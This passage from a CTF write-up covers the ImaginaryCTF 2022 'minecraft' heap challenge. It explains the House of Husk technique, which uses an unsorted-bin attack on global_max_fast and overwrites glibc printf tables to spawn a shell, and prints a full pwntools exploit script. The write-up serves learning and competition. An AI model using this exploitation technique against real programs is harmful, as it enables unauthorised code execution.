+<h3 id="House-of-Husk"><a href="#House-of-Husk" class="headerlink" title="House of Husk"></a>House of Husk</h3><p>To exploit this challenge we will be using the <code>House of Husk</code> Technique. We don’t have leaks in this binary and with the constraints of single UAF &amp; WAF house of husk method should be doable. We have <code>system</code> function available in our binary and the binary does not have ASLR (NO PIE).</p>
+<p>The <a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html">manpage</a> says </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The GNU C Library lets you define your own custom conversion specifiers </span><br><span class="line">for  `printf`  template strings, to teach  `printf`  clever ways to print </span><br><span class="line">the important data structures of your program.</span><br><span class="line">The way you do this is by registering the conversion with the function `register_printf_function`;</span><br></pre></td></tr></table></figure>
+
+<p>The way you register a new format specifier is by overwriting the <code>__printf_function_table</code> with a non null value and <code>__printf_arginfo_table</code> with a pointer to the fake table we created in the heap.</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1381">vprintf</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([__glibc_unlikely](https:<span class="comment">//elixir.bootlin.com/glibc/glibc-2.31/C/ident/__glibc_unlikely) ([__printf_function_table](https://elixir.bootlin.com/glibc/glibc-2.31/C/ident/__printf_function_table) != NULL</span></span><br><span class="line">	|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">	|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">  <span class="keyword">goto</span> do_positional;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1726">do_positional</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Hand off processing for positional parameters.  */</span></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1748">printf_positional</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:   <span class="comment">/* No arguments.  */</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:   <span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">       type and size.  */</span></span><br><span class="line">  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">     all the types.  */</span></span><br><span class="line">  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">    (&amp;specs[cnt].info,</span><br><span class="line">     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">     &amp;args_size[specs[cnt].data_arg]); <span class="comment">// **RIP CONTROL**</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Overwriting the <code>global_max_fast</code> variable qualifies large chunks for fastbin insertion when freed. Freeing a large chunk and linking it into the fastbin for its size will write the address of that chunk into an offset from the first fastbin. This allows an attacker to overwrite an 8 byte aligned qword with a heap address. The formula to calculate the size of a chunk needed to overwrite a target with its address when freed is chunk_size &#x3D; (delta * 2) + 0x20,* with delta being the distance between the first fastbin and the target in bytes.</p>
+<h3 id="Exploit-stages"><a href="#Exploit-stages" class="headerlink" title="Exploit stages"></a>Exploit stages</h3><ul>
+<li>Create a large chunk (<strong>A</strong>).</li>
+<li>Create large chunk (<strong>B</strong>) &amp; (<strong>C</strong>)of crafted size to overwrite <code>__printf_function_table</code> &amp; <code>__printf_arginfo_table</code> accordingly.</li>
+<li>Create a chunk of any size to avoid consolidation.</li>
+<li>Delete chunk <strong>A</strong>, -&gt; <code>breakblock(a)</code> and choose “y” option to trigger UAF.</li>
+<li>Overwrite the fd of chunk <strong>A</strong> with some random value and partially overwrite the last two bytes of bk value of unsorted bin to point to <code>global_max_fast-0x10</code> in order to achieve this there is a 4 bit bruteforce to get the address of <code>global_max_fast</code> right.<br>-&gt;<code>replaceblock(a, p64(0xDEADBEF) + p16(0xB940 - 0x10))</code>.</li>
+<li>Allocate another chunk of the same size as <strong>A</strong> chunk to overwrite <code>global_max_fast</code> with the address of <code>main_arena</code>.</li>
+<li>Delete chunk <strong>B</strong> to overwrite <code>__printf_function_table</code> to make it a Non Null value.</li>
+<li>Delete chunk <strong>C</strong> to overwrite <code>__printf_arginfo_table</code> with fake crafted table.</li>
+</ul>
+<p>Before freeing chunk B &amp; C</p>
+<p>  <img src="https://imgur.com/VqLnTs2.png" alt="enter image description here"></p>
+<p>After freeing chunk B &amp; C</p>
+<p><img src="https://imgur.com/cGCtaKl.png" alt="enter image description here"><br> I tried to use different specifiers for printf and then finally my team mate <code>IceCreamMan</code> found that using <code>%.26739d\x00</code> as the argument ends up setting <code>rdi</code> as <code>sh\x00</code>. </p>
+<figure class="highlight python"><figcaption><span>expl.py</span><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/4n0nym4u5/CTF-Writeups/main/ImaginaryCTF-22/minecraft/expl.py">expl.py</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&quot;minecraft.chal.imaginaryctf.org&quot;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">set follow-fork-mode parent</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">libc = SetupLibcELF()</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">breakBlock</span>(<span class="params">idx, keep</span>):</span><br><span class="line">    sla(<span class="string">b&quot;(l)eak the end poem&quot;</span>, <span class="string">b&quot;b&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">    sla(<span class="string">b&quot;keep in inventory?&quot;</span>, keep)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewBlock</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;(l)eak the end poem&quot;</span>, <span class="string">b&quot;l&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">placeBlock</span>(<span class="params">idx, <span class="built_in">len</span>, content</span>):</span><br><span class="line">    sla(<span class="string">b&quot;(l)eak the end poem&quot;</span>, <span class="string">b&quot;p&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">    sla(<span class="string">b&quot;len&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>).encode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">    sla(<span class="string">b&quot;type of block:&quot;</span>, content)</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replaceBlock</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">b&quot;(l)eak the end poem&quot;</span>, <span class="string">b&quot;r&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">    sa(<span class="string">b&quot;type of block:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset2size</span>(<span class="params">ofs</span>):</span><br><span class="line">    <span class="keyword">return</span> (ofs) * <span class="number">2</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_offset</span>(<span class="params">ASCII_val</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">ord</span>(ASCII_val) - <span class="number">2</span>) * <span class="number">8</span> <span class="comment"># to calculate the offset of the format specifier in the __printf_arginfo_table</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAIN_ARENA = <span class="number">0x3EBC40</span></span><br><span class="line">GLOBAL_MAX_FAST = <span class="number">0x3ED940</span></span><br><span class="line">PRINTF_FUNCTABLE = <span class="number">0x3F0738</span></span><br><span class="line">PRINTF_ARGINFO = <span class="number">0x3EC870</span></span><br><span class="line">ONE_GADGET = <span class="number">0x10A38C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%X\x00&quot;</span></span><br><span class="line">fake_tbl = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        get_table_offset(<span class="string">&quot;d&quot;</span>): p(exe.sym.system),</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line">placeBlock(<span class="number">9</span>, <span class="number">0x520</span>, <span class="string">b&quot;AAAA&quot;</span>)  <span class="comment"># junk</span></span><br><span class="line">a = placeBlock(<span class="number">0</span>, <span class="number">0x520</span>, <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">b = placeBlock(<span class="number">1</span>, offset2size(PRINTF_FUNCTABLE - MAIN_ARENA), <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">c = placeBlock(<span class="number">2</span>, offset2size(PRINTF_ARGINFO - MAIN_ARENA), fake_tbl)</span><br><span class="line">placeBlock(<span class="number">3</span>, <span class="number">0x520</span>, <span class="string">b&quot;%d\x00&quot;</span>.ljust(<span class="number">0x520</span> - <span class="number">1</span>, <span class="string">b&quot;C&quot;</span>))  <span class="comment"># junk</span></span><br><span class="line"></span><br><span class="line">breakBlock(a, <span class="string">b&quot;y&quot;</span>)  <span class="comment"># trigger UAF</span></span><br><span class="line"></span><br><span class="line">replaceBlock(</span><br><span class="line">    a, p(<span class="number">0xDEADBEF</span>) + p16(<span class="number">0xF940</span> - <span class="number">0x10</span>)</span><br><span class="line">)  <span class="comment"># overwrite fd and bk of unsorted bin using Write After Free primitive</span></span><br><span class="line"></span><br><span class="line">placeBlock(<span class="number">4</span>, <span class="number">0x520</span>, <span class="string">b&quot;%.26739d\x00&quot;</span>)  <span class="comment"># unsorted bin attack 26739 = sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">breakBlock(b, <span class="string">b&quot;n&quot;</span>)</span><br><span class="line">breakBlock(c, <span class="string">b&quot;n&quot;</span>)</span><br><span class="line">viewBlock(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://maxwelldulin.com/BlogPost?post=3107454976">https://maxwelldulin.com/BlogPost?post=3107454976
+</a><br><a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Fun"><span class="toc-number">1.</span> <span class="toc-text">Format String Fun</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">1.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug"><span class="toc-number">1.3.</span> <span class="toc-text">Bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#minecraft"><span class="toc-number">2.</span> <span class="toc-text">minecraft</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-1"><span class="toc-number">2.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-1"><span class="toc-number">2.2.</span> <span class="toc-text">Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#place-a-block"><span class="toc-number">2.2.1.</span> <span class="toc-text">place a block</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#break-a-block"><span class="toc-number">2.2.2.</span> <span class="toc-text">break a block</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#replace-a-block"><span class="toc-number">2.2.3.</span> <span class="toc-text">replace a block</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-the-end-poem"><span class="toc-number">2.2.4.</span> <span class="toc-text">leak the end poem</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug-1"><span class="toc-number">2.3.</span> <span class="toc-text">Bug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unintended-bug"><span class="toc-number">2.3.1.</span> <span class="toc-text">Unintended bug</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-Husk"><span class="toc-number">2.4.</span> <span class="toc-text">House of Husk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-stages"><span class="toc-number">2.5.</span> <span class="toc-text">Exploit stages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&text=Imaginary CTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&is_video=false&description=Imaginary CTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Imaginary CTF 2022&body=Check out this article: http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&title=Imaginary CTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&name=Imaginary CTF 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/07/25/Imaginary%20CTF%202022/&t=Imaginary CTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    4n0nym4u5
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
